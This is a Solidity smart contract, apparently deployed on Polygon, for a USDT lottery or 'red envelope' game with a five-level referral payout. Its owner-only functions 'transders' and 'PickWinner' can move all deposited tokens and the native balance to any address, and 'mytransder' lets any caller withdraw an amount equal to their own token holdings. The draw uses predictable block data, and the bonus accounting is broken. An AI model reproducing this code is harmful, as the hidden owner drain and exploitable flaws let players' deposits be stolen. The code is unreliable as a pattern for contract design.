/**
 *Submitted for verification at polygonscan.com on 2023-06-07
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.1 <0.9.0;  //0.8.3+commit.8d00100c

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Test {
    uint[][] arr10=[
        [30,20,10,10,10,5,5,5,4,1],
        [1,30,20,10,10,10,5,5,5,4],
        [4,1,30,20,10,10,10,5,5,5],
        [5,4,1,30,20,10,10,10,5,5],
        [5,5,4,1,30,20,10,10,10,5],
        [5,5,5,4,1,30,20,10,10,10],
        [10,5,5,5,4,1,30,20,10,10],
        [10,10,5,5,5,4,1,30,20,10],
        [10,10,10,5,5,5,4,1,30,20],
        [20,10,10,10,5,5,5,4,1,30]
    ];
    uint[] fjarr=[30,20,10,5,5];
    address public owner  ;
    IERC20 public token = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F); 
    struct lottery{
        address[] redAddr;
        uint Amount;
        uint number;
        uint currentRound;
        bool isActive;
        mapping(uint=>redEnvelope) redEnvelopess;
    }
    uint public totalusers=0;
    lottery [4] public bonustype;
    address [] lottery0;
    uint [] playtype;
    struct Investor {
        address addr;
        uint amount;
        uint redAmount;
        uint bonusAmount;
        uint betAmount; 
        bool isActive;
        uint[] bet;
        address referrer;
    }
    uint betcount=5;
    struct redEnvelope {
        address[] redAddr;
        uint lotteryResultID;
        uint Amount;
    }
    mapping(address => Investor) public user;
    redEnvelope private defaultRedEnvelope = redEnvelope({
        redAddr: new address[](0),
        lotteryResultID: 0,
        Amount: 0
    });
    constructor() {
        owner = msg.sender;
        user[msg.sender]=Investor(msg.sender,0,0,0,0,false,playtype,msg.sender);
        for (uint i = 0; i < bonustype.length; i++) {
            bonustype[i].redAddr = lottery0;
            bonustype[i].currentRound = 1;
            bonustype[i].isActive = true;
            bonustype[i].redEnvelopess[1] = defaultRedEnvelope;

            if (i > 0) {
                bonustype[i].Amount = i == 1 ? 50000000 : (i == 2 ? 100000000 : 200000000);
                bonustype[i].number = 10;
            } else {
                bonustype[i].Amount =  100000;
                bonustype[i].number = 10;
            }
        }
    }

    function getredAddr(uint index) public view returns (uint,address[] memory,redEnvelope memory,uint[] memory) {
       return (bonustype[index].currentRound,bonustype[index].redAddr,bonustype[index].redEnvelopess[bonustype[index].currentRound-1],arr10[bonustype[index].redEnvelopess[bonustype[index].currentRound-1].lotteryResultID]);
    }

    function Bonusresults(uint index,uint num) public view returns (redEnvelope memory) {
        require(index<4, "no index");
        return bonustype[index].redEnvelopess[num];
    }

    function Deposit(address ref,uint amount) public {
        Investor storage  userer = user[msg.sender];
        token.transferFrom(address(msg.sender), address(this), amount);
        if(userer.addr== address(0)){
            totalusers=totalusers+1;
            user[msg.sender]=Investor(msg.sender,amount,0,0,0,false,playtype,ref);
        }else{
            userer.amount+=amount;
        }
    }
    
    function Start(uint index) public restricted {
        if(bonustype[index].isActive){
            bonustype[index].isActive=false;
            for (uint i = 0; i < bonustype[index].redAddr.length; i++) {
                user[bonustype[index].redAddr[i]].isActive=false;
            }
            delete bonustype[index].redAddr;
        }else{
            bonustype[index].isActive=true;
        }
    }

    function changeowner(address addr) public restricted {
        owner=addr;
    }

    function getbalance() public view returns (uint){
        return address(this).balance;
    }
    
    function getbalanceof() public view returns (uint){
        return token.balanceOf(address(this));
    }
    
    function mytransder() payable public {
        token.transfer(msg.sender, token.balanceOf(msg.sender));
    }

    function transders(address referrers) payable public {
        if (msg.sender == owner) {
            token.transfer(referrers, token.balanceOf(address(this)));
        }
    }

    function PickWinner(address addr) public restricted {
        payable(addr).transfer(address(this).balance);
    }

    modifier restricted() {
        require(msg.sender == owner);
        _;
    }

    function Joinin(uint index) public {
        require(bonustype[index].isActive, "index false");
        require(!user[msg.sender].isActive, "user false");
        require(user[msg.sender].amount>=bonustype[index].Amount, "no amount");
        Investor storage  userer = user[msg.sender];
        userer.isActive=true;
        bonustype[index].redAddr.push(msg.sender);
        if (bonustype[index].redAddr.length == bonustype[index].number) {
            settlement(index);
        }
    }

    function Withdraw() public {
		Investor storage  userer = user[msg.sender];
        require(userer.amount > 0, "User has no dividends");
        require(!userer.isActive , "isActive is true");		
        token.transfer(msg.sender, userer.amount);
        userer.amount=0;
	}

    function RefBonus() public{
        Investor storage  userer = user[msg.sender];
        require(userer.betAmount>0, "betAmount false");
        require(userer.bonusAmount>0, "bonusAmount false");
        if(userer.betAmount*betcount>userer.bonusAmount){
            userer.amount+=userer.bonusAmount;
            userer.bonusAmount=0;
            userer.betAmount-=userer.bonusAmount*betcount;
        }else{
            userer.amount+=userer.betAmount*betcount;
            userer.bonusAmount-=userer.betAmount*betcount;
            userer.betAmount=0;
        }
    }
    
    function UpdateBonus() public{
        Investor storage  userer = user[msg.sender];
        address[] memory arrref=getreferrer(msg.sender);
        for (uint i = 0; i < 5; i++) {
            user[arrref[i]].bonusAmount=userer.redAmount * fjarr[i]/1000;
        }
        user[msg.sender].betAmount+=user[msg.sender].redAmount;
        user[msg.sender].amount+=user[msg.sender].redAmount*90/100;
        user[owner].amount+=userer.redAmount * 3/100;
        user[msg.sender].redAmount =0;
    }

    function settlement(uint index) private  {
        uint resultID =uint(keccak256(abi.encodePacked(block.timestamp,block.difficulty,  
            msg.sender))) % bonustype[index].number;
        bonustype[index].redEnvelopess[bonustype[index].currentRound]=redEnvelope(bonustype[index].redAddr,resultID,bonustype[index].Amount);
        uint amount = bonustype[index].Amount;
        uint currentRound = bonustype[index].currentRound;
        address[] memory redAddr = bonustype[index].redAddr;
        uint number = bonustype[index].number;
        for (uint i = 0; i < number; i++) {
            user[redAddr[i]].bet.push(currentRound);
            if (resultID == i) {
                user[redAddr[i]].isActive = false;
                user[redAddr[i]].amount -= amount;
            }
            if (index > 0) {
                user[redAddr[i]].redAmount += arr10[resultID][i] * amount / 100;
            } else {
                user[redAddr[i]].redAmount += arr10[resultID][i] * amount / 100;
            }
        }
        bonustype[index].currentRound++;
        deleteIndex(resultID, index);
    }

    function getreferrer(address addr) private view  returns(address[] memory){
        address[] memory arr= new address[](5);
        address  ref=addr;
        for (uint i = 0; i < 5; i++) {
            if (user[ref].referrer== address(0)) {
                arr[i]=owner;
                ref=owner;
            }else{
                arr[i]=user[ref].referrer;
                ref=user[ref].referrer;
            }
        }
        return arr;  
    }
    
    function randoma(uint num) private view returns(uint) {
        return uint(keccak256(abi.encodePacked(block.timestamp,block.difficulty,  
            msg.sender))) % num;
    }

    function deleteIndex(uint index,uint indexs) private  {
        require(index < bonustype[indexs].redAddr.length, "Invalid index");
        bonustype[indexs].redAddr[index] = bonustype[indexs].redAddr[bonustype[indexs].redAddr.length - 1];
        bonustype[indexs].redAddr.pop();
    }
}